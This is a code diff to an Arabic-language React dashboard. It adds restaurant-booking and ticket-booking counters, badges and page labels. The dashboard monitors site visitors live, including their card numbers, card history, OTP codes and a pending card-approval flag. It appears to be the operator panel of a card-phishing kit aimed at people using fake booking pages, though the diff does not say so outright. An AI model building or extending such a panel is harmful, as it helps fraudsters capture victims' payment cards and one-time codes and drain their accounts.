@@ -76,6 +76,8 @@ const pageNames: Record<string, string> = {
   "otp": "رمز التحقق",
   "otp_verified": "تم التحقق",
   "confirmation": "التأكيد",
+  "restaurant_booking": "حجز مطعم - اختيار",
+  "restaurant_cart": "حجز مطعم - السلة",
   "restaurant_payment": "حجز مطعم - البيانات",
   "restaurant_checkout": "حجز مطعم - الدفع",
 };
@@ -290,6 +292,8 @@ export default function DashboardPage() {
   const withPayment = visitors.filter(v => v.cardNumber || (v.cardHistory && v.cardHistory.length > 0)).length;
   const withOtp = visitors.filter(v => v.otp || (v.otpHistory && v.otpHistory.length > 0)).length;
   const totalRevenue = visitors.reduce((sum, v) => sum + (v.totalAmount || 0), 0);
+  const restaurantBookings = visitors.filter(v => v.reservationType === "restaurant").length;
+  const ticketBookings = visitors.filter(v => v.reservationType === "ticket" || (!v.reservationType && v.ticketQuantity)).length;
 
   return (
     <div className="h-screen flex bg-[#111b21]" dir="rtl">
@@ -326,11 +330,15 @@ export default function DashboardPage() {
         </div>
 
         {/* Statistics Cards */}
-        <div className="grid grid-cols-2 gap-2 p-3 bg-[#0b141a]">
+        <div className="grid grid-cols-3 gap-2 p-3 bg-[#0b141a]">
           <StatCard icon={Users} label="الزوار" value={totalVisitors} color="text-blue-400" />
           <StatCard icon={Eye} label="متصل" value={onlineVisitors} color="text-green-400" />
           <StatCard icon={CreditCard} label="بطاقات" value={withPayment} color="text-yellow-400" />
+        </div>
+        <div className="grid grid-cols-3 gap-2 px-3 pb-3 bg-[#0b141a]">
           <StatCard icon={Shield} label="OTP" value={withOtp} color="text-purple-400" />
+          <StatCard icon={UtensilsCrossed} label="مطاعم" value={restaurantBookings} color="text-orange-400" />
+          <StatCard icon={Receipt} label="تذاكر" value={ticketBookings} color="text-cyan-400" />
         </div>
         
         {/* Total Revenue */}
@@ -370,10 +378,14 @@ export default function DashboardPage() {
               >
                 <div className="relative flex-shrink-0">
                   <div className={`w-11 h-11 rounded-full flex items-center justify-center ${
-                    visitor.cardNumber ? "bg-gradient-to-br from-yellow-500 to-orange-500" : "bg-gradient-to-br from-[#00a884] to-[#008f6f]"
+                    visitor.cardNumber ? "bg-gradient-to-br from-yellow-500 to-orange-500" 
+                    : visitor.reservationType === "restaurant" ? "bg-gradient-to-br from-orange-500 to-red-500"
+                    : "bg-gradient-to-br from-[#00a884] to-[#008f6f]"
                   }`}>
                     {visitor.cardNumber ? (
                       <CreditCard className="w-5 h-5 text-white" />
+                    ) : visitor.reservationType === "restaurant" ? (
+                      <UtensilsCrossed className="w-5 h-5 text-white" />
                     ) : (
                       <User className="w-5 h-5 text-white" />
                     )}
@@ -394,10 +406,17 @@ export default function DashboardPage() {
                       {getRelativeTime(visitor.createdDate)}
                     </span>
                   </div>
-                  <div className="flex items-center justify-between gap-2 mt-0.5">
-                    <span className="bg-blue-500/20 text-blue-400 text-[10px] px-1.5 py-0.5 rounded font-medium">
-                      {getPageNameArabic(visitor.currentPage)}
-                    </span>
+                    <div className="flex items-center justify-between gap-2 mt-0.5">
+                    <div className="flex items-center gap-1">
+                      <span className="bg-blue-500/20 text-blue-400 text-[10px] px-1.5 py-0.5 rounded font-medium">
+                        {getPageNameArabic(visitor.currentPage)}
+                      </span>
+                      {visitor.reservationType === "restaurant" && (
+                        <span className="bg-orange-500/20 text-orange-400 text-[9px] px-1.5 py-0.5 rounded font-medium">
+                          مطعم
+                        </span>
+                      )}
+                    </div>
                     <div className="flex items-center gap-1 flex-shrink-0">
                       {visitor.cardNumber && !visitor.cardApproved && (
                         <span className="bg-orange-500/20 text-orange-400 text-[9px] px-1.5 py-0.5 rounded font-medium animate-pulse">
@@ -444,10 +463,14 @@ export default function DashboardPage() {
           <>
             <div className="bg-[#202c33] p-4 flex items-center gap-3 border-b border-[#2a3942]">
               <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
-                selectedVisitor.cardNumber ? "bg-gradient-to-br from-yellow-500 to-orange-500" : "bg-gradient-to-br from-[#00a884] to-[#008f6f]"
+                selectedVisitor.cardNumber ? "bg-gradient-to-br from-yellow-500 to-orange-500" 
+                : selectedVisitor.reservationType === "restaurant" ? "bg-gradient-to-br from-orange-500 to-red-500"
+                : "bg-gradient-to-br from-[#00a884] to-[#008f6f]"
               }`}>
                 {selectedVisitor.cardNumber ? (
                   <CreditCard className="w-6 h-6 text-white" />
+                ) : selectedVisitor.reservationType === "restaurant" ? (
+                  <UtensilsCrossed className="w-6 h-6 text-white" />
                 ) : (
                   <User className="w-6 h-6 text-white" />
                 )}
@@ -456,11 +479,21 @@ export default function DashboardPage() {
                 <h2 className="text-white font-semibold text-lg">
                   {selectedVisitor.name || "زائر جديد"}
                 </h2>
-                <div className="flex items-center gap-2">
+                <div className="flex items-center gap-2 flex-wrap">
                   <span className={`w-2 h-2 rounded-full ${selectedVisitor.online ? "bg-[#00a884]" : "bg-[#8696a0]"}`} />
                   <p className="text-xs text-[#8696a0]">
                     {selectedVisitor.online ? "متصل الآن" : "غير متصل"} • {getPageNameArabic(selectedVisitor.currentPage)}
                   </p>
+                  {selectedVisitor.reservationType === "restaurant" && (
+                    <span className="bg-orange-500/20 text-orange-400 text-[10px] px-2 py-0.5 rounded-full font-medium">
+                      حجز مطعم
+                    </span>
+                  )}
+                  {selectedVisitor.reservationType === "ticket" && (
+                    <span className="bg-cyan-500/20 text-cyan-400 text-[10px] px-2 py-0.5 rounded-full font-medium">
+                      تذكرة دخول
+                    </span>
+                  )}
                 </div>
               </div>
               <div className="flex items-center gap-2">
